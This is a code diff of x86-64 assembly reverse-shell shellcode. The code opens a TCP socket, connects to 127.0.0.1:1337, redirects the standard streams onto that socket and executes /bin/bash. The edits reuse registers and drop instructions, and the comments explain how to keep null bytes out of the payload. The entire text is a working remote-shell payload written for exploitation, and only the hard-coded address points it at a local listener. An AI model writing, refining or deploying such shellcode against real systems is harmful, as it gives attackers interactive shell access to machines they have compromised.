@@ -14,7 +14,7 @@ _socket:
     mov dl, 6 ; IPPROTO_TCP
     mov ax, 359; sys_socket
     int 0x80 ; syscall
-    mov r13, rax ; save file descriptor
+    mov rdi, rax ; save file descriptor to rdi because connect() expects it there, we can also use rdi in dup2
 
 _connect:
     mov rax, 0x0100007f39050002 ; 127.0.0.1:1337 AF_INET
@@ -22,14 +22,14 @@ _connect:
 
     xor rax, rax ; clear rax, this results in no 0 bytes in the shellcode
     mov al, 42 ; connect
-    mov rdi, r13
+    ; rdi is normally set, but we've already set it it in _socket
     mov rsi, rsp
     mov dl, 0x10
     syscall
 
 _dup2:
     xor rcx, rcx ; stdout, set 0 to rcx without using mov rcx, 0 -> which results in 0 bytes in the shellcode
-    mov rbx, r13
+    mov rbx, rdi
     mov al, 63 ; dup2
     int 0x80
 
@@ -41,10 +41,9 @@ _dup2:
     ; prepare execing bin/bash
     mov al, `h` ; we use al here, becaue we don't want to padd with 0 bytes
     push ax ; we push ax here because we want to add a zero byte after /bin/bash on the stack
-    mov rax, `/bin/bas`
-    push rax
+    mov rbx, `/bin/bas` ; use rbx here, because we don't depend on it afterwards, so we save a xor to clear it
+    push rbx
 
-    xor rax, rax ; clear rax, this results in no 0 bytes in the shellcode
     mov al, 59 ; execve, use al, this results in no 0 bytes in the shellcode
     mov rdi, rsp
     xor rsi, rsi
